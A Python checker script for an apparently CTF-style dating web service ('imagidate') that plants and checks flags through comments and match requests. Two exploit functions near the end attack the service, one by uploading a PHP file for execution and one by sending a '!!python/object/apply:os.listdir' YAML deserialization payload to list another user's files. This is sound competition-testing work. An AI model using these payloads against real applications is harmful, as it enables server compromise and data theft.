from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
#import faker
import secrets
import re
from hashlib import md5
import binascii
import os


from typing import Optional
from logging import LoggerAdapter
from httpx import AsyncClient, Response

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 8080
checker = Enochecker("imagidate", SERVICE_PORT)
app = lambda: checker.app
IMAGES_DIR = "Images"

"""
Utility functions
"""
def assert_response(
        logger: LoggerAdapter,
        res : Response,
        matching_text: str,
        errmsg: Optional[str] = None
) -> None:
    if not matching_text in res.text:
        logger.error("Failed"
                     + f"Info: {res.text}")
        if errmsg is None:
            errmsg = f"{res.request.method} {res.request.url.path} failed with {res.text}"
        raise MumbleException(errmsg)

async def register_user(logger: LoggerAdapter, client: AsyncClient):
    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    age = random.randint(20,45)
    gender = secrets.choice(["Male", "Female", "Other"])

    data = {
        "username" : username,
        "password" : password,
        "confirm_password" : password,
        "age" : age,
        "gender" : gender
    }
    register_res = await client.post("/register.php", data=data)
    assert_response(logger,register_res,"Registration successful")

    return username, password

async def login_user(username, password, logger, client: AsyncClient):
    data = {
        "username" : username,
        "password" : password,
    }
    login_res = await client.post("/login.php", data=data, follow_redirects=True)
    assert_response(logger, login_res, "Profile of")

    return login_res.text

def get_user_id(text):
    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', text)
    user_id = id_match.group(1)
    return user_id

async def post_comment(comment: str, public: bool, user_id, logger, client):
    if public:
        data = {
            "comment_text" : comment,
            "is_public": 1
        }

    else:
        data = {
            "comment_text" : comment
        }

    putflag_res = await client.post(f"/profile.php?id={user_id}", data=data)
    assert_response(logger, putflag_res, "Comment added successfully")

async def request_match(username, punchline, custom_filename, logger, client):
    if custom_filename is not None:
        data = {
            "username" : username,
            "age" : random.randint(20,45),
            "gender" : secrets.choice(["Male", "Female", "Other"]),
            "requested_username" : secrets.choice(["habibi", "habibti"]),
            "punchline" : punchline,
            "custom_filename" : custom_filename
        }
    else:
        data = {
            "username" : username,
            "age" : random.randint(20,45),
            "gender" : secrets.choice(["Male", "Female", "Other"]),
            "requested_username" : secrets.choice(["habibi", "habibti"]),
            "punchline" : punchline,
        }

    match_res = await client.post("/match.php", data=data)
    assert_response(logger, match_res, "Data sent succesfully")

async def upload_image(logger, client):
    image_path = f"{IMAGES_DIR}/{secrets.choice(images)}"
    f = open(image_path, "rb")
    file = {"image": ("profile.jpg", f)}
    upload_res = await client.post("/upload.php", files=file, follow_redirects=True)
    assert_response(logger, upload_res, "Profile of")

punchlines = [
    "Hi! How's your day going?",
    "What kind of music do you like?",
    "Have you seen any good movies lately?",
    "What's the most interesting book you've read recently?",
    "Do you have any hobbies or interests?",
    "What's your favorite way to spend a weekend?",
    "Have you traveled anywhere exciting recently?",
    "What's your favorite cuisine or dish?",
    "Do you have any pets?",
    "What's the best advice you've ever received?",
    "If you could visit any place in the world, where would it be?",
    "What's a skill you'd like to learn someday?",
    "What's your favorite season of the year and why?",
    "Do you prefer the beach or the mountains?",
    "What's the last TV show you binge-watched?",
    "What's something you're really passionate about?",
    "What's your favorite way to relax after a long day?",
    "What's the most memorable concert or event you've been to?",
    "Do you enjoy cooking or baking? What's your favorite recipe?",
    "If you could have dinner with any three people, dead or alive, who would they be?"
]

life_facts = [
    "I love coding at night",
    "My cats name is Pixel",
    "I learned Python in school",
    "Coffee fuels my mornings",
    "I collect vintage computers",
    "Reading sci-fi is my hobby",
    "I run marathons for fun",
    "I write poetry in secret",
    "My favorite food is sushi",
    "I speak three languages fluently",
    "I play guitar and sing",
    "I travel to new countries yearly",
    "I enjoy painting landscapes",
    "I am a fan of Linux",
    "I dislike social media",
    "I meditate every morning",
    "My dogs name is Binary",
    "I teach coding to kids",
    "I bike to work daily",
    "I practice yoga every evening",
    "I love hiking mountains",
    "I garden on weekends",
    "I brew my own beer",
    "I compose electronic music",
    "I build robots as a hobby",
    "I love board games nights",
    "I write my own blog",
    "I volunteer at animal shelters",
    "I am a fan of Star Trek",
    "I enjoy solving puzzles",
    "I participate in hackathons",
    "I have a twin brother",
    "I cook Italian dishes",
    "I enjoy stargazing",
    "I collect comic books",
    "I am a history buff",
    "I play chess competitively",
    "I love baking bread",
    "I make origami sculptures",
    "I read biographies frequently",
    "I dance salsa",
    "I run a small business",
    "I am learning Mandarin",
    "I kayak in the summer",
    "I enjoy classical music",
    "I am an amateur photographer",
    "I like Linux and hate Windows"
]

private_facts = [
    "I have a secret tattoo",
    "Im afraid of heights",
    "I struggle with anxiety",
    "I once cheated on a test",
    "I secretly love reality TV",
    "Im estranged from my sibling",
    "I have a phobia of spiders",
    "I lied on my resume",
    "I still sleep with a teddy bear",
    "Ive never been kissed",
    "I have a hidden bank account",
    "Im insecure about my looks",
    "I was bullied in school",
    "I secretly dislike my job",
    "Ive been in therapy for years",
    "I feel lonely often",
    "Im afraid of public speaking",
    "I had a secret relationship",
    "I regret not finishing college",
    "I once stole something small",
    "I have trust issues",
    "I fake confidence at work",
    "I suffer from imposter syndrome",
    "Ive never told anyone my dreams",
    "I cry easily",
    "I have a chronic illness",
    "Ive been ghosted before",
    "Im scared of being alone",
    "I dont like my best friend",
    "I have a secret talent",
    "I fear disappointing my parents",
    "Ive lied about my age",
    "I have nightmares frequently",
    "I hide my true feelings",
    "Ive broken someones heart",
    "Im embarrassed by my past",
    "I feel inadequate often",
    "I dislike my partners family",
    "Im scared of getting old",
    "I envy my friends lives",
    "I worry about money constantly",
    "Ive struggled with addiction",
    "I feel trapped in my life",
    "I have body image issues",
    "I wish I were someone else",
    "Ive kept secrets from my partner",
    "I worry Ill never be happy",
    "I fear people dont like me",
    "I struggle with depression"
]

images  = os.listdir(IMAGES_DIR)
"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_db(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
):
    
    # register and login
    username, password = await register_user(logger, client)
    login_res = await login_user(username,password, logger, client)

    # find user_id
    user_id = get_user_id(login_res)

    # deploy flag
    await post_comment(task.flag, False, user_id, logger, client)

    # save user in db
    await db.set("userdata", (username, password, user_id))

    # return username for the attackinfo
    return f"User: {username}"

@checker.getflag(0)
async def getflag_db(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    
    # get username, password from db
    try:
        username, password, user_Id = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    # login
    login_res = await login_user(username,password, logger, client)

    # search flag
    profile_res = await client.get(f"/profile.php?id={user_Id}")
    assert_in(task.flag, profile_res.text, "FLAG NOT FOUND")

@checker.putflag(1)
async def putflag_api(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    
    # register and login
    username, password = await register_user(logger, client)
    login_res = await login_user(username, password, logger, client)
    
    # find user_id
    user_id = get_user_id(login_res)

    # deploy flag
    await request_match(username, secrets.choice(punchlines), task.flag, logger, client)

    # save user in db
    await db.set("userdata", (username, password, user_id))
    
    # return username for the attackinfo
    return f"User: {username}"    

@checker.getflag(1)
async def getflag_api(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    
    # get username, password from db
    try:
        username, password, user_Id = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    # login
    login_res = await login_user(username, password, logger, client)

    # search flag
    data = {
        "username" : username
    }
    profile_res = await client.post(f"/check_response.php", data=data)
    output = profile_res.content.replace(b"\\\\", b"\\").decode("unicode-escape")
    assert_in(task.flag.encode().hex(), output, "FLAG NOT FOUND")

@checker.putnoise(0)
async def putnoise_profile(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
    
    # register and login
    username, password = await register_user(logger, client)
    login_res = await login_user(username,password, logger, client)

    # find user_id
    user_id = get_user_id(login_res)


    # post some comments
    comment_1 = secrets.choice(life_facts)
    comment_2 = secrets.choice(life_facts)
    comment_3 = secrets.choice(private_facts)
    comment_4 = secrets.choice(private_facts)
    await post_comment(comment_1, True, user_id, logger, client)
    await post_comment(comment_2, True, user_id, logger, client)
    await post_comment(comment_3, False, user_id, logger, client)
    await post_comment(comment_4, False, user_id, logger, client)

    # upload a profile picture
    await upload_image(logger, client)

    await db.set("userdata", (username, password, user_id, comment_1, comment_2, comment_3, comment_4))
        
@checker.getnoise(0)
async def getnoise_profile(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
    try:
        (username, password, user_id, comment_1, comment_2, comment_3, comment_4) = await db.get('userdata')
    except:
        raise MumbleException("Putnoise Failed!") 

    login_res = await login_user(username, password, logger, client)

    assert_in(comment_1, login_res, "Comment not Found")
    assert_in(comment_2, login_res, "Comment not Found")
    assert_in(comment_3, login_res, "Comment not Found")
    assert_in(comment_4, login_res, "Comment not Found")

@checker.putnoise(1)
async def putnoise_match(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
    username, password = await register_user(logger, client)
    login_res = await login_user(username,password, logger, client)

    name1: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    name2: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

    # find user_id
    user_id = get_user_id(login_res)

    #await request_match(username, secrets.choice(punchlines), None, logger, client)
    await request_match(username, secrets.choice(punchlines), name1, logger, client)
    await request_match(username, secrets.choice(punchlines), name2, logger, client)

    await db.set("userdata", (username, password, user_id, name1, name2))

@checker.getnoise(1)
async def getnoise_match(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient):
    try:
        (username, password, user_id, name1, name2) = await db.get('userdata')
    except:
        raise MumbleException("Putnoise Failed!")
    
    login_res = await login_user(username, password, logger, client)

    data = {
        "username" : username
    }
    profile_res = await client.post(f"/check_response.php", data=data)
    assert_in(name1.encode().hex(), profile_res.text, "hex of filename not found")
    assert_in(name2.encode().hex(), profile_res.text, "hex of filename not found")
    
#@checker.havoc(0)
#async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#    logger.debug(f"Connecting to service")
#    welcome = await conn.reader.readuntil(b">")
#
#    # In variant 0, we'll check if the help text is available
#    logger.debug(f"Sending help command")
#    conn.writer.write(f"help\n".encode())
#    await conn.writer.drain()
#    helpstr = await conn.reader.readuntil(b">")
#
#    for line in [
#        "This is a notebook service. Commands:",
#        "reg USER PW - Register new account",
#        "log USER PW - Login to account",
#        "set TEXT..... - Set a note",
#        "user  - List all users",
#        "list - List all notes",
#        "exit - Exit!",
#        "dump - Dump the database",
#        "get ID",
#    ]:
#        assert_in(line.encode(), helpstr, "Received incomplete response.")
#
#@checker.havoc(1)
#async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#    logger.debug(f"Connecting to service")
#    welcome = await conn.reader.readuntil(b">")
#
#    # In variant 1, we'll check if the `user` command still works.
#    username = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#    password = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#
#    # Register and login a dummy user
#    await conn.register_user(username, password)
#    await conn.login_user(username, password)
#
#    logger.debug(f"Sending user command")
#    conn.writer.write(f"user\n".encode())
#    await conn.writer.drain()
#    ret = await conn.reader.readuntil(b">")
#    if not b"User 0: " in ret:
#        raise MumbleException("User command does not return any users")
#
#    if username:
#        assert_in(username.encode(), ret, "Flag username not in user output")
#
#    # conn.writer.close()
#    # await conn.writer.wait_closed()
#
#@checker.havoc(2)
#async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#    logger.debug(f"Connecting to service")
#    welcome = await conn.reader.readuntil(b">")
#
#    # In variant 2, we'll check if the `list` command still works.
#    username = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#    password = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#    randomNote = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=36)
#    )
#
#    # Register and login a dummy user
#    await conn.register_user(username, password)
#    await conn.login_user(username, password)
#
#    logger.debug(f"Sending command to save a note")
#    conn.writer.write(f"set {randomNote}\n".encode())
#    await conn.writer.drain()
#    await conn.reader.readuntil(b"Note saved! ID is ")
#
#    try:
#        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#    except Exception as ex:
#        logger.debug(f"Failed to retrieve note: {ex}")
#        raise MumbleException("Could not retrieve NoteId")
#
#    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
#
#    logger.debug(f"{noteId}")
#
#    logger.debug(f"Sending list command")
#    conn.writer.write(f"list\n".encode())
#    await conn.writer.drain()
#
#    data = await conn.reader.readuntil(b">")
#    if not noteId.encode() in data:
#        raise MumbleException("List command does not work as intended")
#
@checker.exploit(0)
async def exploit_file_upload(task: ExploitCheckerTaskMessage,
                    searcher: FlagSearcher,
                    client: AsyncClient,
                    logger:LoggerAdapter) -> Optional[str]:
    
    # register and login
    username, password = await register_user(logger, client)
    login_res = await login_user(username,password, logger, client)

    # upload exploit
    file = {"image": open("exp.php", "rb")}
    upload_res = await client.post("/upload.php", files=file, follow_redirects=True)
    assert_response(logger, upload_res, "Profile of")

    # trigger exploit
    hashed_username = md5(username.encode()).hexdigest()
    exp_res = await client.get(f"/uploads/{hashed_username}/exp.php")

    # search flag
    if flag := searcher.search_flag(exp_res.text):
            return flag

    raise MumbleException("flag not found")



@checker.exploit(1)
async def exploit_yaml_load(task: ExploitCheckerTaskMessage,
                            searcher: FlagSearcher, 
                            client: AsyncClient,
                            logger:LoggerAdapter) -> Optional[str]:
    
    victim = task.attack_info.split(" ")[1]
    # register and login
    username, password = await register_user(logger, client)
    login_res = await login_user(username,password, logger, client)
    
    # deploy exploit
    hashed_victim = md5(victim.encode()).hexdigest()
    punchline = f"!!python/object/apply:os.listdir [\"uploads/{hashed_victim}\"]"
    await request_match(username, punchline, None, logger, client)

    # search flag
    data = {
        "username" : username
    }
    check_res = await client.post(f"/check_response.php", data=data)
    flag_pattern = r"- (.+)\.yaml"
    matches = re.findall(flag_pattern, check_res.text)
    
    for match in matches:
        if not match.startswith("data"):
            text = binascii.unhexlify(match).decode("utf-8")
            if flag := searcher.search_flag(text):
                return flag

    raise MumbleException("flag not found")

if __name__ == "__main__":
    checker.run()